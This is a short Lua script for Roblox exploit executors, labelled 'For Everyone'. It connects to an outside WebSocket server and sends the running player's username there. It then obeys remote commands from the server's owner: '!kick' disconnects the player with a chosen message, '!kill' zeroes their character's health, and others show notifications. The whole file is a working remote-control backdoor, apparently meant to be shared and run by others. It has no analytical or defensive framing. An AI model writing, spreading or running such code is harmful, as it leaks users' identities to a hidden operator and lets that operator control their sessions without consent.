--\\ For Everyone //--
local WebSocket = syn.websocket.connect("wss://plants-websocket.glitch.me/") or Krnl.WebSocket.connect("wss://plants-websocket.glitch.me/") or WebSocket.connect("wss://plants-websocket.glitch.me/")
WebSocket.OnMessage:Connect(function(Message)
    local MessageTable = string.split(Message, " ")
    if string.match(string.lower(MessageTable[1]), "!kick") then
        if MessageTable[3] then
            local Command = MessageTable[1] .. MessageTable[2]
            game.Players.LocalPlayer:Kick(string.sub(Message, #Command + 3, #Message))
        else
            game.Players.LocalPlayer:Kick("Kicked By Script Owner.")
        end
    elseif string.match(string.lower(MessageTable[1]), "!clientsconnected") then
        game.StarterGui:SetCore("SendNotification", {
            Title = "Number Of Clients Connected.",
            Text = "Clients Connected: " .. MessageTable[2],
            Duration = 5
        })
    elseif string.match(string.lower(MessageTable[1]), "!kill") then
        if game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid") then
            game.Players.LocalPlayer.Character:FindFirstChildOfClass("Humanoid").Health = 0
        end
    elseif string.match(string.lower(MessageTable[1]), "!port") then
        game.StarterGui:SetCore("SendNotification", {
            Title = "WebSocket Port.",
            Text = "Port Connected: " .. MessageTable[2],
            Duration = 5
        })
    end
end)
WebSocket:Send("!setid " .. string.lower(game.Players.LocalPlayer.Name))
